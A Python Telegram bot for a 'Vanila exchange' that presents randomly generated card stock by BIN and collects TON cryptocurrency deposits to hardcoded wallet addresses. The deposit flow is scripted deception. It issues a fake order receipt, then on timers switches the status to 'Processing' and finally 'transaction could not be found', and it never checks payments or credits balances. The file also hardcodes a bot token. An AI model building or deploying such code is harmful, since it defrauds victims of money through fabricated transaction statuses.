import logging
import datetime
import random
import sqlite3
import asyncio
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- Configuration ---
BOT_TOKEN = "8312816041:AAEVEH0u7PL-MELnS3M0KhMGn84y-NBchvY"

DEPOSIT_ADDRESSES = [
    "UQCgPsBnvSib5rYln5vK0rNfYo__xjfk5OD-0mKU7-n1ACnT",
    "UQCCTTF03CCeyNKov1azQty5iNcNMnwH72J7pcb7MUaDKXsd",
    "UQAZjMCIT6MEMUgvKmweTySPrGqxnUrgvG5JQVUfnR-d_tke",
    "UQBwwD_2VekRaM-7_6wwltzkboxbTiYDqif40G9Tbnq76Td1",
    "UQAMBt7k1FZHvewkpB1IHMLiOMLZR63rO_NKv-fiQ0n5EGW_",
    "UQC9OvldFlHMbxKRq-6yRTm9uWv-YWFcsywHQAZz6p9dtonc"
]

# --- Database Logic ---
def init_db():
    conn = sqlite3.connect('vanila_exchange.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                      (user_id INTEGER PRIMARY KEY, first_name TEXT, balance REAL DEFAULT 0.0)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS cards 
                      (id INTEGER PRIMARY KEY AUTOINCREMENT, bin TEXT, amount REAL, currency TEXT, sticker TEXT, status TEXT DEFAULT 'available')''')
    conn.commit()
    conn.close()

def generate_daily_cards():
    conn = sqlite3.connect('vanila_exchange.db')
    cursor = conn.cursor()
    cursor.execute("DELETE FROM cards")
    all_bins = [('533985xx', 'CAD', '🅶'), ('461126xx', 'CAD', ''), ('373778xx', 'AUD', ''), ('435880xx', 'USD', '')] # সংক্ষেপিত লিস্ট
    cards = []
    for _ in range(random.randint(250, 300)):
        selected = random.choice(all_bins)
        cards.append((selected[0], round(random.uniform(10, 500), 2), selected[1], selected[2]))
    cursor.executemany("INSERT INTO cards (bin, amount, currency, sticker) VALUES (?, ?, ?, ?)", cards)
    conn.commit()
    conn.close()

# --- Functions ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = f"⚡️ Welcome {user.first_name} to Vanila exchange! ⚡️\nCurrent rate is 37%"
    keyboard = [[InlineKeyboardButton("💳 Stock", callback_data="page_1")],
                [InlineKeyboardButton("💰 Deposit", callback_data="deposit")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    await query.answer()

    if data == "deposit":
        addr = random.choice(DEPOSIT_ADDRESSES)
        context.user_data['active_addr'] = addr
        text = (
            f"⚡ VANILA Exchange — TON DEPOSIT ⚡\n\n"
            f"Deposit Information: `{addr}`\n\n"
            f"Minimum Deposit: `15` TON\n\n"
            f"Instructions:\n"
            f"1. Send your deposit to the address above.\n"
            f"2. Wait for 1 confirmation.\n"
            f"3. Your balance will update automatically.\n"
            f"4. Please remember to send TON only through the TON Network. ✅\n\n"
            f"⚠️ WARNING:\n"
            f"- Deposits below the minimum amount will not be processed.\n"
            f"- This address is valid only for your account. Do not share it.\n\n"
            f"⚠️ Note: This deposit session is only active for 30 minutes. Please send your deposit before it expires."
        )
        kb = [[InlineKeyboardButton("Confirm ✅", callback_data="dep_confirm"),
               InlineKeyboardButton("Cancel ⛔", callback_data="dep_cancel")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "dep_confirm":
        context.user_data['step'] = 'waiting_amount'
        await query.message.reply_text("Please enter the amount.......")

    elif data == "dep_cancel":
        await query.message.delete()
        await query.message.reply_text("Deposit request has been canceled.❌\nYou can now create a new deposit request.✅")

async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    step = context.user_data.get('step')
    text = update.message.text

    if step == 'waiting_amount':
        if text.isdigit() and int(text) >= 15:
            context.user_data['amount'] = text
            context.user_data['step'] = 'waiting_txid'
            await update.message.reply_text("Submit withdraw Txid :")
        else:
            await update.message.reply_text("Minimum deposit is 15 TON. Please enter the correct amount like that 15, 16, 20")

    elif step == 'waiting_txid':
        txid = text
        amount = context.user_data.get('amount')
        addr = context.user_data.get('active_addr')
        name = update.effective_user.first_name
        order_no = random.randint(20991, 1000059)
        time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        context.user_data['step'] = None # Reset
        
        response = (
            f"NAME : `{name}`\n"
            f"Address : `{addr}`\n"
            f"AMOUNT : `{amount}`\n"
            f"Txid : `{txid}`\n"
            f"Order Number : `{order_no}`\n"
            f"Stats : `Waiting...`\n"
            f"TIME : `{time_str}`\n\n"
            f"NOTE : Balance will be added within 1/2 minutes. If not added, contact customer care."
        )
        msg = await update.message.reply_text(response, parse_mode="Markdown")

        # ৫০ সেকেন্ড পর Processing...
        await asyncio.sleep(50)
        response = response.replace("`Waiting...`", "`Processing....`")
        await msg.edit_text(response, parse_mode="Markdown")

        # আরও ৫৫ সেকেন্ড পর Error
        await asyncio.sleep(55)
        response = response.replace("`Processing....`", "`transaction could not be found.`")
        await msg.edit_text(response, parse_mode="Markdown")

# --- Main ---
async def main():
    init_db()
    generate_daily_cards()
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))

    # Fake Server for Render
    import http.server, socketserver, threading
    def run_fake_server():
        port = int(os.environ.get("PORT", 8080))
        with socketserver.TCPServer(("", port), http.server.SimpleHTTPRequestHandler) as httpd:
            httpd.serve_forever()
    threading.Thread(target=run_fake_server, daemon=True).start()

    async with app:
        await app.initialize()
        await app.start()
        await app.updater.start_polling()
        await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
